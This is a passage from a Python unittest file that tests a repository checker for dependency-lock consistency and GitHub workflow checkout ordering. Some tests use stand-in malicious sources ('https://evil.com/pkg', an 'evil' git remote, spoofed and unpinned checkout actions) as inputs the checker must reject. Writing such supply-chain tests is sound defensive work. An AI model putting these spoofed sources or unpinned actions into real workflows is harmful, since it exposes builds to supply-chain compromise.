                    if isinstance(python_node, ast.Constant) and isinstance(python_node.value, str)
                    else None
                )
                session_pythons[name_node.value] = python_value

        self.assertEqual(session_pythons["roi_score"], "3.12")
        self.assertEqual(session_pythons["ensemble_kit"], "3.12")

    def test_nox_consumed_locks_have_no_python_platform_and_are_universal(self) -> None:
        manifest = self.checker.load_manifest(ROOT)
        tree = ast.parse((ROOT / "noxfile.py").read_text(encoding="utf-8"))
        installed_locks: set[str] = set()
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            if isinstance(node.func, ast.Attribute) and node.func.attr == "install":
                for idx, arg in enumerate(node.args):
                    if (
                        isinstance(arg, ast.Constant)
                        and arg.value == "-r"
                        and idx + 1 < len(node.args)
                    ):
                        next_arg = node.args[idx + 1]
                        if isinstance(next_arg, ast.Constant) and isinstance(next_arg.value, str):
                            installed_locks.add(next_arg.value)

        self.assertGreaterEqual(len(installed_locks), 4)
        for entry in manifest["locks"]:
            if entry["output"] in installed_locks:
                compile_args = entry.get("compile_args", [])
                self.assertNotIn(
                    "--python-platform",
                    compile_args,
                    f"Nox-consumed lock {entry['output']} must not specify --python-platform",
                )
                self.assertIn(
                    "--universal",
                    compile_args,
                    f"Nox-consumed lock {entry['output']} must specify --universal",
                )

    @staticmethod
    def _extract_lock_pythons(manifest: dict[str, Any]) -> dict[str, str]:
        lock_pythons: dict[str, str] = {}
        for entry in manifest["locks"]:
            compile_args = entry.get("compile_args", [])
            if "--python-version" in compile_args:
                idx = compile_args.index("--python-version")
                if idx + 1 < len(compile_args):
                    lock_pythons[entry["output"]] = compile_args[idx + 1]
        return lock_pythons

    @staticmethod
    def _session_info(node: ast.AST) -> tuple[str, str | None] | None:
        if not isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
            return None
        for decorator in node.decorator_list:
            if not (isinstance(decorator, ast.Call) and isinstance(decorator.func, ast.Attribute)):
                continue
            if not (
                isinstance(decorator.func.value, ast.Name)
                and decorator.func.value.id == "nox"
                and decorator.func.attr == "session"
            ):
                continue
            keywords = {keyword.arg: keyword.value for keyword in decorator.keywords}
            name_node = keywords.get("name")
            if not isinstance(name_node, ast.Constant) or not isinstance(name_node.value, str):
                continue
            session_name = name_node.value
            python_node = keywords.get("python")
            python_value = (
                python_node.value
                if isinstance(python_node, ast.Constant) and isinstance(python_node.value, str)
                else None
            )
            return session_name, python_value
        return None

    @staticmethod
    def _extract_installed_locks(node: ast.AST) -> list[str]:
        session_locks: list[str] = []
        for sub in ast.walk(node):
            if (
                isinstance(sub, ast.Call)
                and isinstance(sub.func, ast.Attribute)
                and sub.func.attr == "install"
            ):
                for idx, arg in enumerate(sub.args):
                    if (
                        isinstance(arg, ast.Constant)
                        and arg.value == "-r"
                        and idx + 1 < len(sub.args)
                    ):
                        next_arg = sub.args[idx + 1]
                        if isinstance(next_arg, ast.Constant) and isinstance(next_arg.value, str):
                            session_locks.append(next_arg.value)
        return session_locks

    def test_nox_sessions_and_locks_exact_python_agreement(self) -> None:
        manifest = self.checker.load_manifest(ROOT)
        tree = ast.parse((ROOT / "noxfile.py").read_text(encoding="utf-8"))
        lock_pythons = self._extract_lock_pythons(manifest)

        for node in tree.body:
            info = self._session_info(node)
            if not info:
                continue
            session_name, python_value = info
            session_locks = self._extract_installed_locks(node)
            if not session_locks:
                continue
            pkg_locks = [
                loc for loc in session_locks if loc != "requirements/locks/package-build.txt"
            ]
            target_lock = pkg_locks[0] if pkg_locks else session_locks[0]
            expected_python = lock_pythons.get(target_lock)
            self.assertIsNotNone(
                python_value,
                f"Session {session_name} must explicitly pin python version to agree with lock {target_lock}",
            )
            self.assertEqual(
                python_value,
                expected_python,
                f"Session {session_name} python {python_value} does not agree with lock {target_lock} python {expected_python}",
            )

    def test_ensemble_kit_lock_has_no_unconditional_nvidia_triton_residue(self) -> None:
        lock_path = ROOT / "tools/ensemble-training-kit/requirements-dev-lock.txt"
        if not lock_path.exists():
            self.skipTest("ensemble lock not yet generated")
        content = lock_path.read_text(encoding="utf-8")
        for line in content.splitlines():
            line_str = line.strip()
            if line_str.startswith("triton=="):
                self.assertIn(
                    "sys_platform == 'linux'",
                    line_str,
                    f"triton in ensemble lock must have sys_platform == 'linux' marker: {line_str}",
                )
            if line_str.startswith("cuda-bindings=="):
                self.assertIn(
                    "sys_platform == 'linux'",
                    line_str,
                    f"cuda-bindings in ensemble lock must have sys_platform == 'linux' marker: {line_str}",
                )

    def test_tracked_consumer_paths_distinguishes_docs_from_container_recipes(self) -> None:
        paths = self.checker.tracked_consumer_paths(ROOT)
        # Markdown / docs should NOT be included
        self.assertNotIn(Path("docs/adr/by-tag/containerfile.md"), paths)
        self.assertNotIn(Path("changelog.d/fixed/containerfile-dpkg-gitam-bash.md"), paths)
        self.assertNotIn(Path("changelog.d/fixed/containerfile-post-rename-sweep.md"), paths)
        # Real Dockerfile and Containerfile variants MUST be included
        self.assertIn(Path("Dockerfile"), paths)
        self.assertIn(Path("docker/Dockerfile.production"), paths)
        self.assertIn(Path("dev/Containerfile"), paths)
        self.assertIn(Path("dev/Containerfile.runner"), paths)
        self.assertIn(Path("docker/dev/ubuntu-26.04.Dockerfile"), paths)
        self.assertIn(Path("docker/dev/alpine-3.20.Dockerfile"), paths)
        self.assertIn(Path("mcp-server/vmaf-mcp/Dockerfile"), paths)
        self.assertIn(Path(".devcontainer/Dockerfile.praetor"), paths)

    def test_out_of_tree_cli_check_passes_from_unrelated_cwd(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            result = subprocess.run(  # noqa: S603
                [sys.executable, str(CHECKER), "--root", str(ROOT), "check"],
                cwd=temp_dir,
                capture_output=True,
                text=True,
                check=False,
            )
            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
            self.assertIn("python dependency locks: OK", result.stdout)

    def test_out_of_tree_local_source_resolution_without_global_chdir(self) -> None:
        # Bare name 'ai' must resolve against explicit ROOT even if current working directory has no 'ai'
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            self.assertFalse((temp_path / "ai").exists())
            findings = self.checker.scan_install_commands(
                Path(".github/workflows/example.yml"),
                "run: pip install --no-deps --no-build-isolation -e ai\n",
                root=ROOT,
            )
            self.assertEqual(findings, [])
            bad_findings = self.checker.scan_install_commands(
                Path(".github/workflows/example.yml"),
                "run: pip install --no-deps --no-build-isolation -e nonexistent-package\n",
                root=ROOT,
            )
            self.assertEqual(len(bad_findings), 1)

    def test_local_source_check_resolves_against_explicit_root(self) -> None:
        self.assertTrue(self.checker._is_local_source("ai", root=ROOT))
        self.assertTrue(self.checker._is_local_source(".", root=ROOT))
        self.assertTrue(self.checker._is_local_source("./ai", root=ROOT))
        self.assertFalse(self.checker._is_local_source("malicious-pkg", root=ROOT))
        self.assertFalse(self.checker._is_local_source("https://evil.com/pkg", root=ROOT))
        self.assertFalse(self.checker._is_local_source("git@github.com:evil/pkg.git", root=ROOT))

    def test_repository_contract_is_current(self) -> None:
        result = subprocess.run(  # noqa: S603
            [sys.executable, str(CHECKER), "--root", str(ROOT), "check"],
            text=True,
            capture_output=True,
            check=False,
        )
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)


class WorkflowCheckoutOrderingTests(unittest.TestCase):
    checker: Any

    @classmethod
    def setUpClass(cls) -> None:
        cls.checker = load_checker()

    def test_workflow_checkout_ordering_enforced_across_repository(self) -> None:
        workflows = sorted((ROOT / ".github" / "workflows").glob("*.yml"))
        self.assertGreaterEqual(len(workflows), 30)
        for workflow in workflows:
            text = workflow.read_text(encoding="utf-8")
            findings = self.checker.scan_workflow_checkout_ordering(workflow, text, root=ROOT)
            self.assertEqual(
                findings,
                [],
                f"Workflow {workflow.name} consumes repo resources before actions/checkout: {findings}",
            )

    def test_precheckout_requirements_lockfile_rejected(self) -> None:
        text = """
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Install
        run: python -m pip install --require-hashes -r requirements/locks/build.txt
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
"""
        findings = self.checker.scan_workflow_checkout_ordering(
            Path(".github/workflows/test.yml"), text, root=ROOT
        )
        self.assertEqual(len(findings), 1)
        self.assertIn(
            "consumes repo-local requirements file 'requirements/locks/build.txt'", findings[0]
        )

    def test_no_checkout_requirements_lockfile_rejected(self) -> None:
        text = """
jobs:
  sbom:
    runs-on: ubuntu-latest
    steps:
      - name: Prepare
        run: python -m pip install --require-hashes -r mcp-server/vmaf-mcp/requirements-runtime-lock.txt
"""
        findings = self.checker.scan_workflow_checkout_ordering(
            Path(".github/workflows/supply-chain.yml"), text, root=ROOT
        )
        self.assertEqual(len(findings), 1)
        self.assertIn(
            "consumes repo-local requirements file 'mcp-server/vmaf-mcp/requirements-runtime-lock.txt'",
            findings[0],
        )

    def test_precheckout_helper_file_rejected(self) -> None:
        text = """
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Load config
        run: scripts/ci/load-build-config.sh >> "$GITHUB_ENV"
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
"""
        findings = self.checker.scan_workflow_checkout_ordering(
            Path(".github/workflows/test.yml"), text, root=ROOT
        )
        self.assertEqual(len(findings), 1)
        self.assertIn(
            "consumes repo-local helper file 'scripts/ci/load-build-config.sh'", findings[0]
        )

    def test_precheckout_editable_package_rejected(self) -> None:
        text = """
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Install editable
        run: pip install --no-deps --no-build-isolation -e .
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
"""
        findings = self.checker.scan_workflow_checkout_ordering(
            Path(".github/workflows/test.yml"), text, root=ROOT
        )
        self.assertEqual(len(findings), 1)
        self.assertIn("consumes repo-local editable target '.'", findings[0])

    def test_precheckout_local_action_rejected(self) -> None:
        text = """
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: ./.github/actions/setup-build
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
"""
        findings = self.checker.scan_workflow_checkout_ordering(
            Path(".github/workflows/test.yml"), text, root=ROOT
        )
        self.assertEqual(len(findings), 1)
        self.assertIn("consumes local action './.github/actions/setup-build'", findings[0])

    def test_post_checkout_consumers_accepted(self) -> None:
        text = """
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
      - name: Load config
        run: scripts/ci/load-build-config.sh >> "$GITHUB_ENV"
      - name: Install
        run: python -m pip install --require-hashes -r requirements/locks/build.txt
      - name: Editable
        run: pip install --no-deps --no-build-isolation -e .
"""
        findings = self.checker.scan_workflow_checkout_ordering(
            Path(".github/workflows/test.yml"), text, root=ROOT
        )
        self.assertEqual(findings, [])

    def test_fallback_parser_detects_precheckout_violations(self) -> None:
        text = """
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Run script
        run: scripts/ci/load-build-config.sh
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
"""
        with mock.patch.object(self.checker, "yaml", None):
            findings = self.checker.scan_workflow_checkout_ordering(
                Path(".github/workflows/test.yml"), text, root=ROOT
            )
            self.assertEqual(len(findings), 1)
            self.assertIn("consumes repo-local helper file", findings[0])

    def _scan_both_modes(self, path: Path, text: str) -> tuple[list[str], list[str]]:
        pyyaml_findings = self.checker.scan_workflow_checkout_ordering(path, text, root=ROOT)
        with mock.patch.object(self.checker, "yaml", None):
            fallback_findings = self.checker.scan_workflow_checkout_ordering(path, text, root=ROOT)
        return pyyaml_findings, fallback_findings

    def test_spoofed_or_unpinned_checkout_rejected_both_modes(self) -> None:
        template = """
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: {uses}
      - name: Load config
        run: scripts/ci/load-build-config.sh
"""
        invalid_uses = [
            "spoofed/actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
            "actions/checkout-spoof@3d3c42e5aac5ba805825da76410c181273ba90b1",
            "evil-actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
            "actions/checkout@v4",
            "actions/checkout@3d3c42",
            "actions/checkout@master",
        ]
        for uses in invalid_uses:
            text = template.format(uses=uses)
            pyyaml_res, fallback_res = self._scan_both_modes(
                Path(".github/workflows/test.yml"), text
            )
            self.assertEqual(len(pyyaml_res), 1, f"PyYAML accepted invalid uses: {uses}")
            self.assertEqual(len(fallback_res), 1, f"Fallback accepted invalid uses: {uses}")
            self.assertIn("consumes repo-local helper file", pyyaml_res[0])
            self.assertIn("consumes repo-local helper file", fallback_res[0])

        valid_text = template.format(
            uses="actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
        )
        pyyaml_res, fallback_res = self._scan_both_modes(
            Path(".github/workflows/test.yml"), valid_text
        )
        self.assertEqual(pyyaml_res, [])
        self.assertEqual(fallback_res, [])

    def test_foreign_repository_checkout_rejected_both_modes(self) -> None:
        template = """
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
        with:
          repository: {repo}
      - name: Load config
        run: scripts/ci/load-build-config.sh
"""
        foreign_repos = ["foreign/repo", "VMAFx/pelorus", "Netflix/vmaf", "evil/checkout"]
        for repo in foreign_repos:
            text = template.format(repo=repo)
            pyyaml_res, fallback_res = self._scan_both_modes(
                Path(".github/workflows/test.yml"), text
            )
            self.assertEqual(len(pyyaml_res), 1, f"PyYAML accepted foreign repo: {repo}")
            self.assertEqual(len(fallback_res), 1, f"Fallback accepted foreign repo: {repo}")
            self.assertIn("consumes repo-local helper file", pyyaml_res[0])
            self.assertIn("consumes repo-local helper file", fallback_res[0])

        for local_repo in ["${{ github.repository }}", "VMAFx/vmafx", "vmafx/vmafx"]:
            valid_text = template.format(repo=local_repo)
            pyyaml_res, fallback_res = self._scan_both_modes(
                Path(".github/workflows/test.yml"), valid_text
            )
            self.assertEqual(pyyaml_res, [], f"PyYAML rejected local repo: {local_repo}")
            self.assertEqual(fallback_res, [], f"Fallback rejected local repo: {local_repo}")

    def test_conditional_checkout_rejected_both_modes(self) -> None:
        template = """
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
        if: {cond}
      - name: Install
        run: python -m pip install --require-hashes -r requirements/locks/build.txt
"""
        conditions = [
            "github.event_name == 'push'",
            "always()",
            "true",
            "success()",
            "${{ github.event_name == 'pull_request' }}",
        ]
        for cond in conditions:
            text = template.format(cond=cond)
            pyyaml_res, fallback_res = self._scan_both_modes(
                Path(".github/workflows/test.yml"), text
            )
            self.assertEqual(len(pyyaml_res), 1, f"PyYAML accepted conditional checkout: {cond}")
            self.assertEqual(
                len(fallback_res), 1, f"Fallback accepted conditional checkout: {cond}"
            )
            self.assertIn("consumes repo-local requirements file", pyyaml_res[0])
            self.assertIn("consumes repo-local requirements file", fallback_res[0])

    def test_continue_on_error_checkout_rejected_both_modes(self) -> None:
        template = """
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
        continue-on-error: {coe}
      - name: Install
        run: python -m pip install --require-hashes -r requirements/locks/build.txt
"""
        truthy_values = ["true", "True", "yes", "1", "${{ matrix.experimental }}"]
        for coe in truthy_values:
            text = template.format(coe=coe)
            pyyaml_res, fallback_res = self._scan_both_modes(
                Path(".github/workflows/test.yml"), text
            )
            self.assertEqual(
                len(pyyaml_res), 1, f"PyYAML accepted continue-on-error checkout: {coe}"
            )
            self.assertEqual(
                len(fallback_res), 1, f"Fallback accepted continue-on-error checkout: {coe}"
            )
            self.assertIn("consumes repo-local requirements file", pyyaml_res[0])
            self.assertIn("consumes repo-local requirements file", fallback_res[0])

        valid_text = template.format(coe="false")
        pyyaml_res, fallback_res = self._scan_both_modes(
            Path(".github/workflows/test.yml"), valid_text
        )
        self.assertEqual(pyyaml_res, [])
        self.assertEqual(fallback_res, [])

    def test_subdirectory_path_checkout_rejected_both_modes(self) -> None:
        template = """
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
        with:
          path: {path}
      - name: Install
        run: python -m pip install --require-hashes -r requirements/locks/build.txt
"""
        subdirs = ["sub/directory", ".ci/pelorus", "nested", "./sub"]
        for path in subdirs:
            text = template.format(path=path)
            pyyaml_res, fallback_res = self._scan_both_modes(
                Path(".github/workflows/test.yml"), text
            )
            self.assertEqual(len(pyyaml_res), 1, f"PyYAML accepted subdirectory path: {path}")
            self.assertEqual(len(fallback_res), 1, f"Fallback accepted subdirectory path: {path}")
            self.assertIn("consumes repo-local requirements file", pyyaml_res[0])
            self.assertIn("consumes repo-local requirements file", fallback_res[0])

        for root_path in [".", "./", '""']:
            valid_text = template.format(path=root_path)
            pyyaml_res, fallback_res = self._scan_both_modes(
                Path(".github/workflows/test.yml"), valid_text
            )
            self.assertEqual(pyyaml_res, [], f"PyYAML rejected root path: {root_path}")
            self.assertEqual(fallback_res, [], f"Fallback rejected root path: {root_path}")

    def test_folded_yaml_run_split_flags_detected_both_modes(self) -> None:
        text_folded = """
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Install
        run: >
          python -m pip install --require-hashes -r
          requirements/locks/build.txt
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
"""
        text_folded_chomp = """
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Install
        run: >-
          python -m pip install
          --require-hashes
          -r
          requirements/locks/build.txt
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
"""
        for text in [text_folded, text_folded_chomp]:
            pyyaml_res, fallback_res = self._scan_both_modes(
                Path(".github/workflows/test.yml"), text
            )
            self.assertEqual(len(pyyaml_res), 1)
            self.assertEqual(len(fallback_res), 1)
            self.assertIn(
                "consumes repo-local requirements file 'requirements/locks/build.txt'",
                pyyaml_res[0],
            )
            self.assertIn(
                "consumes repo-local requirements file 'requirements/locks/build.txt'",
                fallback_res[0],
            )

    def test_repository_workflows_enforced_in_fallback_mode(self) -> None:
        workflows = sorted((ROOT / ".github" / "workflows").glob("*.yml"))
        self.assertGreaterEqual(len(workflows), 30)
        with mock.patch.object(self.checker, "yaml", None):
            for workflow in workflows:
                text = workflow.read_text(encoding="utf-8")
                findings = self.checker.scan_workflow_checkout_ordering(workflow, text, root=ROOT)
                self.assertEqual(
                    findings,
                    [],
                    f"Fallback parser reported false-positive on {workflow.name}: {findings}",
                )


if __name__ == "__main__":
    unittest.main()
